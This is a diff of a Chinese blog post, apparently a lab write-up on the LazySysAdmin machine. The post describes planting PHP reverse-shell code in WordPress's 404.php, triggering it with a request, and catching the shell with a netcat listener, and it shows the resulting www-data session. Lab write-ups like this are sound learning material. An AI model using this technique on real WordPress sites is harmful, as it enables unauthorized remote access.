@@ -382,9 +382,10 @@ define(&#39;DB_COLLATE&#39;, &#39;&#39;);
 <p>在开头这里<code>插入</code>php反弹shell的代码</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA18.png" alt="18"></p>
 <p>然后开启端口监听，在随便访问一个不存在的文件（目的是为了404.php）</p>
-<pre><code>172.31.19.221/wordpress/?p=Knlvre.php
-</code></pre><p>然后就可以拿下shell，后续提权不再去做了</p>
-<pre><code>root@Knlvre:~# nc -lvnp 3737
+<pre><code class="url">172.31.19.221/wordpress/?p=Knlvre.php
+</code></pre>
+<p>然后就可以拿下shell，后续提权不再去做了</p>
+<pre><code class="bash">root@Knlvre:~# nc -lvnp 3737
 listening on [any] 3737 ...
 connect to [172.31.19.207] from (UNKNOWN) [172.31.19.221] 59424
 Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
@@ -396,8 +397,8 @@ $ whoami
 www-data
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$
-</code></pre><hr>
+</code></pre>
+<hr>
 <p><strong>Reference</strong></p>
 <p><a href="https://xz.aliyun.com/t/2789" target="_blank" rel="noopener">https://xz.aliyun.com/t/2789</a></p>
 <p><a href="https://www.cnblogs.com/yuzly/p/10800861.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10800861.html</a></p>
